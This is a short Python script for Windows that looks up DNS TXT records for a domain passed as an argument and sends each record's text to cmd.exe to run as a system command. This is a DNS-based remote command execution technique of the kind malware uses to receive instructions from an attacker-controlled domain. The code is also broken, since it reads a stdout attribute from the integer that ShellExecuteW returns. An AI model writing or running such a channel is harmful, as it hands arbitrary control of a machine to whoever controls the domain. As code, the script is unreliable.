import sys
import ctypes
import re

def run_system_command(command):
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "open", "cmd.exe", "/c " + command, None, 1)
    except Exception as e:
        print(f"An error occurred while executing system command: {e}")

def query_txt_records(domain):
    try:
        # Run nslookup command to query TXT records for the domain
        result = ctypes.windll.shell32.ShellExecuteW(None, "open", "nslookup.exe", f"-type=TXT {domain}", None, 0)

        # Check if the command executed successfully
        if result > 32:
            # Extract strings after "text = " using regex
            txt_records = re.findall(r'text = "(.*)"', result.stdout)

            if txt_records:
                print("TXT records for", domain)
                for record in txt_records:
                    print(record)
                    # Run system-level command using the extracted string
                    run_system_command(record)
            else:
                print(f"No TXT records found for {domain}")
        else:
            print(f"Error executing nslookup command: {result}")
            
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    # Check if a domain is provided as a command-line argument
    if len(sys.argv) != 2:
        print("Usage: python script.py <domain>")
        return

    domain = sys.argv[1]
    query_txt_records(domain)

if __name__ == "__main__":
    main()
